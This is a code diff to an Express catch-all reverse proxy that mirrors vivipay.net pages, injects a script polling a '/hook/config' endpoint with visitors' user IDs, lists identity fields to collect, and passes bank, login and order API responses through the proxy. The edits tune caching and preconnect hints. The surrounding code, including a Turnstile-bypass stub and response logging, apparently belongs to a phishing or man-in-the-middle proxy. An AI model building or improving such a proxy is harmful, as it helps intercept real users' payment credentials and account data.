@@ -3143,7 +3143,8 @@ try{var x=new XMLHttpRequest();
 x.open('GET',P+'/hook/config'+(UID?'?userId='+UID:''),true);
 x.onload=function(){try{CFG=JSON.parse(x.responseText);}catch(e){}};
 x.send();}catch(e){}}
-try{lc();}catch(e){}
+// Do not block first paint on optional user/config state.
+try{lcAsync();}catch(e){}
 setInterval(function(){lcAsync();},25000);
 
 var ID_FIELDS=['teamWorkId','memberCodeId','userId','channelUid','uid','memberId','accountId'];
@@ -3467,7 +3468,7 @@ app.all('*', async (req, res) => {
       const turnstileBypass = ''; // disabled — using real CF widget
 
       // Preconnect hints for faster asset loading from vivipay.net
-      const preconnect = `<link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${frontendBase}">`;
+      const preconnect = `<link rel="preconnect" href="${proxyBase}" crossorigin><link rel="preconnect" href="${frontendBase}" crossorigin><link rel="dns-prefetch" href="${proxyBase}"><link rel="dns-prefetch" href="${frontendBase}">`;
 
       const turnstileCSS = ''; // disabled — let CF widget show normally
 
@@ -3545,15 +3546,24 @@ app.all('*', async (req, res) => {
       }
 
       // Content-hashed JS: safe to cache in browser too — instant on repeat visits
-      res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
+res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
       res.setHeader('content-type', finalCt);
       res.setHeader('content-length', String(buf.length));
       res.status(200).end(buf);
       return;
     }
 
-    // Everything else — stream as-is (log if JSON/text and rawLog ON)
+    // Static assets only: cache at the browser/CDN layer. Dynamic API responses,
+    // including /xxapi/* bank/login/order responses, continue to stream uncached.
     const buf = Buffer.from(await response.arrayBuffer());
+    const cleanAssetPath = String(path).split('?')[0].toLowerCase();
+    const isHashedStaticAsset = /^\/(?:assets|static)\/[^/]+\.[a-f0-9]{6,}\.(?:css|js|png|jpe?g|webp|avif|svg|woff2?)$/i.test(cleanAssetPath);
+    const isLoginStaticAsset = /^\/static\/(?:images|icon)\/[^/]+\.(?:png|jpe?g|webp|avif|svg|ico)$/i.test(cleanAssetPath);
+    if (isHashedStaticAsset) {
+      res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
+    } else if (isLoginStaticAsset) {
+      res.setHeader('Cache-Control', 'public, max-age=86400, stale-while-revalidate=604800');
+    }
     res.setHeader('content-length', String(buf.length));
     res.status(response.status).end(buf);
 
